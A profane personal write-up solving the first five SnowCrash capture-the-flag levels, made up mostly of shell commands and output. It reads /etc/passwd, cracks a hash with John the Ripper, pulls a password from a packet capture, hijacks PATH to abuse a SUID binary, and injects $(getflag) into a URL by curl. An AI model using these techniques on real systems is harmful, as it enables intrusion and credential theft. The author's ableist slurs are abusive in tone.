# snowcrash, why am I doing this to myself
This is supposed to be some introductory project to cybersecurity.
#### random shit I found
```
level00@SnowCrash:~$ users
level00 level00
```
there are no fucking files, don't know where the fuck to start this retarded shit
```
level00@SnowCrash:~$ps -U level00
  PID TTY          TIME CMD
 1935 tty1     00:00:00 bash
 2194 ?        00:00:00 sshd
 2195 pts/0    00:00:00 bash
 2314 pts/0    00:00:00 ps
```
*no weird processes noted by this fucking stupid user*
```
level00@SnowCrash:~$find / -user level00 -type f 2> /dev/null
```
*what the fuck, endless fucking files, kill me*
So I was looking for the wrong user, apparently flag00 is a fucking user
```
find / -group flag00 2>/dev/null
```
## file found for flag00, /usr/sbin/john
containing
```
cdiiddwpgswtgt
```
looks like a cypher, but which one, kill me

using this baby **https://www.boxentriq.com/code-breaking/cipher-identifier**
detected **Bifid Cipher**, tried decyphering, nothing, fucking retarded detector

### trying Caesar Cipher cuz it's the second recommend
outputs: nottoohardhere
```
level00@SnowCrash:~$ su flag00
Password: 
Don't forget to launch getflag !
flag00@SnowCrash:~$ getflag
Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
```
## level01
Of course this bullshit is empty again
### stupid blind enumeration commands
```
env
```
*show all env variables, nothing fucking interesting*
```
sudo -l
```
*display all sudo info for current user, asks for the fucking password, kill me*
```
find / -perm /6000 2>/dev/null;
```
*shows all SUID and SGID files, nothing interesting to note*
```
cat /etc/shadow
```
*perm denied*
```
cat /etc/passwd
```
*listing users in the system*
Shows user flag01
```
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```
fucking kill me, need to crack the passwd file, googled of course, **John the Ripper**, and yay, can't use it on the retarded Snowcrash machine

**tried to fucking use docker but the fucking retarded mac is fucking retarded, KILL ME**
Using google cloud, john installed, need to send the passwd file
```
scp -P 4242 level01@10.12.100.115:/etc/passwd .
```
Nothing connection timed out, kill me, copied the passwd file, download wordlist from **https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Software/john-the-ripper.txt**
```
~$ /usr/sbin/john --wordlist=wordlist.txt passwd
$ /usr/sbin/john --show passwd 
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
1 password hash cracked, 0 left
```
*tada*
```
su flag01
Password:abcdefg
Don't forget to launch getflag !
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
flag01@SnowCrash:~$ su level02
Password:f2av5il02puano7naaf6adaaf
```
## level02
#### tshark, I think?
```
scp -P 4242 level02@10.12.100.115:/home/user/level02/level02.pcap .
```
Using tshark to open capture file, found
```
0000   00 24 1d 0f 00 ad 08 00 27 cc 8a 1e 08 00 45 00   .$......'.....E.
0010   00 41 d4 b3 40 00 40 06 16 77 3b e9 eb df 3b e9   .A..@.@..w;...;.
0020   eb da 2f 59 99 4f ba a8 fb 18 9d 18 15 7b 80 18   ../Y.O.......{..
0030   01 c5 27 9d 00 00 01 01 08 0a 02 c2 3c 62 01 1b   ..'.........<b..
0040   b9 87 00 0d 0a 50 61 73 73 77 6f 72 64 3a 20      .....Password: 
```
*at No 43*

reading the following lines` Data :
```
66 74 5f 77 61 6e 64 72 7f 7f 7f 4e 44 52 65 6c 7f 4c
```
Using hex to ascii, **ft_wandrNDRelL0L**, authentication failure, I guess i have missed the last hex
```
66 74 5f 77 61 6e 64 72 7f 7f 7f 4e 44 52 65 6c 7f 4c 30 4c
```
**ft_wandrNDRelL0L**
```
su flag02
Password: ft_wandrNDRelL0L
Don't forget to launch getflag !
flag02@SnowCrash:~$ getflag
Check flag.Here is your token : kooda2puivaav1idi4f57q8iq
flag02@SnowCrash:~$ su level03
Password:kooda2puivaav1idi4f57q8iq
```
## level03
#### exploitme
```
level03@SnowCrash:~$ ls -al
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```
*executable has SUID permission, **When you execute a program that has the SUID bit enabled, you inherit the permissions of that program's owner***

Using **binary ninja**
```
mov     dword [esp], data_80485e0  {"/usr/bin/env echo Exploit me"}
```
*create symbolic link of echo that runs getflag, of course permission denied, so i used /tmp*
```
level03@SnowCrash:~$ln -s /bin/getflag /tmp/echo
level03@SnowCrash:~$ export PATH=.:$PATH
level03@SnowCrash:/tmp$ ./level03
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
```
*Fucking kill me*
#### I'm a fucking idiot retard, PATH should be PATH=/tmp:$PATH
```
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ su level04
Password:qi0maab88jeaj46qoumi7maus
```
## level04, fucking perl
Executing it doesn't print shit, tried editing 
```
curl http://10.12.100.115:4747/\?x\=$\(getflag\)
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```